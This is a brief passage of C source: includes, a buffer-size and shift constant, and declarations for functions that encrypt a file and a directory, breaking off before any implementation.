#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>
#include <ctype.h>

#define BUFFER_SIZE 8000
#define SHIFT 7

void encrypt_file(const char *filepath);
void encrypt_directory(const char *folder_path);